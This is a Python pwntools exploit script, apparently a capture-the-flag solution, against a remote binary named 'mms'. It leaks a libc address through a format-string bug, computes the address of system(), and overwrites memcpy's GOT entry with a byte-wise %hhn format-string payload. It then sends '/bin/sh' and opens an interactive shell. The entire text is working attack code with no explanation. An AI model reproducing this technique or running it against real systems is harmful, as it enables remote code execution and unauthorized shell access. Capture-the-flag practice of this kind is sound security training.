from pwn import *

DEBUG = False
if DEBUG:
    p = process(['./mms'])
else:
    p = remote('remote16.goatskin.kr', 13201)
libc = ELF("./libc-2.27.so")
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

puts_got = 0x602020
memcpy_got = 0x602038

p.sendlineafter("> ", "1")          # get libc base
p.sendlineafter("> ", "M")
p.sendlineafter("> ", "1")
p.sendlineafter("> ", "R")
p.sendlineafter("> ", "0")

p.sendlineafter("> ", "1")      # for oneshot
p.sendlineafter("> ", "W")
p.sendlineafter("> ", "0")
p.sendlineafter("> ", "1")
p.sendlineafter("> ", "R")
p.sendlineafter("> ", "0")

p.sendlineafter("> ", "3")
p.sendlineafter("> ", "aaaa")
p.sendlineafter("> ", "1024")
p.sendline("%p%p%p%p"+"A"*8)

p.sendlineafter("> ", "3")
p.recvuntil("----\n")
p.recv(28)

write_libc = int(p.recv(14).split("0x")[1], base=16) - 20
libc_base = write_libc - libc.symbols["write"]
system_libc = write_libc - libc.symbols["write"] + libc.symbols["system"]

#print("@@@@@@@@@@@@@@@@@@@@LIBC_GET@@@@@@@@@@@@@@@@@@")

oneshot = system_libc
oneshot_list = []
of_list = []
for i in range(6):
    oneshot_list.append(oneshot & 0xff)
    oneshot >>= 8
of_list.append(oneshot_list[0])
for i in range(1, 6):
    if oneshot_list[i] > oneshot_list[i-1]:
        of_list.append(oneshot_list[i] - oneshot_list[i-1])
    else:
        of_list.append(0x100 + oneshot_list[i] - oneshot_list[i-1])

payload = ""
for i in range(6):
    payload += ("%" + str(of_list[i]) + "c" + "%" + str(16+i) + "$hhn")

payload = payload.ljust(0x50, " ")

for i in range(6):
    payload += p64(memcpy_got+i)

print(hexdump(payload))

p.sendlineafter("> ", "3")
p.sendline(payload)
p.sendlineafter("> ", "3")

p.sendlineafter("> ", "1")
p.sendlineafter("> ", "M")
p.sendlineafter("> ", "1")
p.sendlineafter("> ", "W")
p.sendlineafter("> ", "1")

p.sendlineafter("> ", "3")
p.sendlineafter("> ", "fuck")
p.sendlineafter("> ", "16")
p.sendline("/bin/sh")
p.sendlineafter("> ", "3")
p.sendline("hahahaha")

p.interactive()